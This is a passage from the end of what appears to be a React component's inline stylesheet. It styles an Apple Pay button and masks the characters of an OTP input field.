          background-position: 50% 50%;
          border-radius: 5px;
          padding: 0px;
          margin: 5px auto;
        }
      
        .apple-pay-button.visible {
          visibility: visible;
        }
        /* ApplePay changes ends */
      
        #otpinput {
          -webkit-text-security: disc;
          -moz-text-security: circle;
          text-security: circle;
        }
      }
      `}</style>
    </div>
  )
}
